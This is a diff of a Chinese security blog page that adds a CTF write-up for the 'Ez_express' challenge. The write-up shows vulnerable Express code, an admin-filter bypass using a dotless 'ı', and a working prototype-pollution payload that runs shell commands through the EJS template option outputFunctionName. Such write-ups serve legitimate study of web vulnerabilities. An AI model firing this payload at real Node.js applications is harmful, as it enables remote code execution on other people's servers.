@@ -85,13 +85,14 @@
 <meta name="description" content="不会javascript, 在看smi1e师傅关于原型链污染攻击的博客时候, 这张图片让我思考了很久  很勉强的自己给自己找到一个比喻: cat.prototype是一个对象, 比作仓库, 仓库里面有按照一定顺序摆放的货物, constructor是在这些货物的基础上做的修改, 比如增加什么东西减去什么东西改变什么东西的顺序之类的. 没有constructor, 仓库就是静态的一个仓库, 也就是对">
 <meta name="keywords" content="CTF WEB">
 <meta property="og:type" content="article">
-<meta property="og:title" content="javascript 原型链污染学习中的一点小问题">
+<meta property="og:title" content="nodejs相关">
 <meta property="og:url" content="http://yoursite.com/2019/11/17/javascript-learn/index.html">
 <meta property="og:site_name" content="CH4SER || 自闭室">
 <meta property="og:description" content="不会javascript, 在看smi1e师傅关于原型链污染攻击的博客时候, 这张图片让我思考了很久  很勉强的自己给自己找到一个比喻: cat.prototype是一个对象, 比作仓库, 仓库里面有按照一定顺序摆放的货物, constructor是在这些货物的基础上做的修改, 比如增加什么东西减去什么东西改变什么东西的顺序之类的. 没有constructor, 仓库就是静态的一个仓库, 也就是对">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/69004994-4e141d80-0956-11ea-8a97-a946b681ac75.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/69007214-fc7b8b00-0975-11ea-9f53-bf96932750ea.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20200223184607314.png">
 <meta property="og:image" content="http://yoursite.com/images/image-20200123220813194.png">
 <meta property="og:image" content="http://yoursite.com/images/image-20200123220954191.png">
 <meta property="og:image" content="http://yoursite.com/images/image-20200123221147765.png">
@@ -102,9 +103,9 @@
 <meta property="og:image" content="http://yoursite.com/images/image-20200123235208032.png">
 <meta property="og:image" content="http://yoursite.com/images/image-20200123235558341.png">
 <meta property="og:image" content="http://yoursite.com/images/image-20200123233034091.png">
-<meta property="og:updated_time" content="2020-01-23T16:28:33.793Z">
+<meta property="og:updated_time" content="2020-02-24T02:03:37.981Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="javascript 原型链污染学习中的一点小问题">
+<meta name="twitter:title" content="nodejs相关">
 <meta name="twitter:description" content="不会javascript, 在看smi1e师傅关于原型链污染攻击的博客时候, 这张图片让我思考了很久  很勉强的自己给自己找到一个比喻: cat.prototype是一个对象, 比作仓库, 仓库里面有按照一定顺序摆放的货物, constructor是在这些货物的基础上做的修改, 比如增加什么东西减去什么东西改变什么东西的顺序之类的. 没有constructor, 仓库就是静态的一个仓库, 也就是对">
 <meta name="twitter:image" content="https://user-images.githubusercontent.com/40637063/69004994-4e141d80-0956-11ea-8a97-a946b681ac75.png">
 
@@ -142,7 +143,7 @@
 
 
 
-  <title>javascript 原型链污染学习中的一点小问题 | CH4SER || 自闭室</title>
+  <title>nodejs相关 | CH4SER || 自闭室</title><meta name="robots" content="noindex">
   
 
 
@@ -318,7 +319,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">javascript 原型链污染学习中的一点小问题</h1>
+          <h1 class="post-title" itemprop="name headline">nodejs相关</h1>
         
 
         <div class="post-meta">
@@ -346,8 +347,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2020-01-24T00:28:33+08:00">
-                2020-01-24
+              <time title="Post modified" itemprop="dateModified" datetime="2020-02-24T10:03:37+08:00">
+                2020-02-24
               </time>
             
           </span>
@@ -374,7 +375,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  1k
+                  1.6k
                 </span>
               
 
@@ -390,7 +391,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  3
+                  6
                 </span>
               
             </div>
@@ -418,6 +419,18 @@
 <p>然后对于p师傅博客中写道关于字典赋值proto无效的问题,实验了一下:</p>
 <p><img src="https://user-images.githubusercontent.com/40637063/69007214-fc7b8b00-0975-11ea-9f53-bf96932750ea.png" alt="image"></p>
 <p>字典在创立的时候应该是先创立字典内的项然后将他们聚合起来, 那么在创立a的时候先创立的是a的原型, 然后再创立的a, 这也就解释了为什么bar传不到Object中去,而是传入了Object的下一级, 也就是a的原型.</p>
+<h2 id="春秋战疫赛-Ez-express">春秋战疫赛 Ez_express</h2>
+<p>源代码如下</p>
+<p>index.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">const</span> isObject = <span class="function"><span class="params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="built_in">Object</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个merge可以造成原型链污染</span></span><br><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// clone和merge效果一样</span></span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.match(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.session.user)&#123;</span><br><span class="line">    res.redirect(<span class="string">'/login'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.outputFunctionName=<span class="literal">undefined</span>;</span><br><span class="line">  res.render(<span class="string">'index'</span>,data=&#123;<span class="string">'user'</span>:req.session.user.user&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/login'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">'login'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(<span class="string">'/login'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.body.Submit==<span class="string">"register"</span>)&#123;</span><br><span class="line">      <span class="comment">// 这里safekeyword就是不让通过ADMIN进行注册</span></span><br><span class="line">   <span class="keyword">if</span>(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(<span class="string">"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;"</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">        <span class="comment">// toUpperCase()除了正常的大小写转化之外会将一些特殊字符进行一个转化</span></span><br><span class="line">      <span class="string">'user'</span>:req.body.userid.toUpperCase(),</span><br><span class="line">      <span class="string">'passwd'</span>: req.body.pwd,</span><br><span class="line">      <span class="string">'isLogin'</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(<span class="string">'/'</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.body.Submit==<span class="string">"login"</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.user)&#123;res.end(<span class="string">"&lt;script&gt;alert('register first');history.go(-1);&lt;/script&gt;"</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">      req.session.user.isLogin=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.end(<span class="string">"&lt;script&gt;alert('error passwd');history.go(-1);&lt;/script&gt;"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.redirect(<span class="string">'/'</span>); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">'/action'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">"ADMIN"</span>)&#123;res.end(<span class="string">"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;"</span>)&#125;</span><br><span class="line">    <span class="comment">// 这里有触发原型链污染的机会</span></span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(<span class="string">"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;"</span>);  </span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">'/info'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">'index'</span>,data=&#123;<span class="string">'user'</span>:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>
+<p>要触发原型链污染有个前提条件:  登录admin, 看源码的意思就是首先需要注册一个ADMIN, 但是<code>safekeyword</code>函数将这个操作限制住了, 然而<code>toUpperCase</code>有字符转化的特点, 参考</p>
+<p><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p>
+<p>因此使用<code>admın </code>和随意的密码去注册一个用户, 就可以登录admin了, 登录admin之后通过action发送如下数据包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;return global.process.mainModule.constructor._load(&apos;child_process&apos;).execSync(&apos;ls&apos;);//&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>发送完之后访问一下/info就拿到了flag</p>
+<p><img src="/images/image-20200223184607314.png" alt="image-20200223184607314"></p>
+<p><a href="https://medium.com/bugbountywriteup/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501" target="_blank" rel="noopener">https://medium.com/bugbountywriteup/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501</a></p>
+<p>[<a href="https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split%20second/split%20second.md?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split second/split second.md?tdsourcetag=s_pctim_aiomsg</a>](<a href="https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split" target="_blank" rel="noopener">https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split</a> second/split <a href="http://second.md?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">second.md?tdsourcetag=s_pctim_aiomsg</a>)</p>
 <h2 id="2019-XNUCA-hardjs-复现">2019 XNUCA hardjs 复现</h2>
 <p>页面功能: 注册 登录 发表评论</p>
 <p>拿到源代码之后首先使用命令<code>npm audit</code>来自动检测一下是否有存在漏洞的依赖包</p>
@@ -447,7 +460,7 @@
 <p>观察渲染模板<code>index.ejs</code>, 发现有一个标签<code>logger</code>不在沙盒限制中并且符合条件, 那么, 可以污染hints让他的原型中包含logger从而让hints在遍历的过程中遍历到logger然后去渲染他, logger里的内容自然是post表单了.</p>
 <p><img src="/images/image-20200123233034091.png" alt="image-20200123233034091"></p>
 <p>还有一种解法, 等我会调试js了就去补</p>
-
+<!-- flag of hidden posts -->
       
     </div>
     
@@ -467,26 +480,6 @@
       
       
 
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2019/10/22/RoarCTFwp/" rel="next" title="RoarCTF复现">
-                <i class="fa fa-chevron-left"></i> RoarCTF复现
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/12/16/vscode-vmware-xdebug/" rel="prev" title="使用vscode和xdebug实现远程调试虚拟机中的php项目">
-                使用vscode和xdebug实现远程调试虚拟机中的php项目 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
       
 
       
@@ -562,7 +555,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-count">46</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -654,7 +647,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#2019-XNUCA-hardjs-复现"><span class="nav-number">1.</span> <span class="nav-text">2019 XNUCA hardjs 复现</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#春秋战疫赛-Ez-express"><span class="nav-number">1.</span> <span class="nav-text">春秋战疫赛 Ez_express</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2019-XNUCA-hardjs-复现"><span class="nav-number">2.</span> <span class="nav-text">2019 XNUCA hardjs 复现</span></a></li></ol></div>
             
 
           </div>
@@ -688,7 +681,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">74.6k</span>
+    <span title="Site words total count">77.4k</span>
   
 
   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
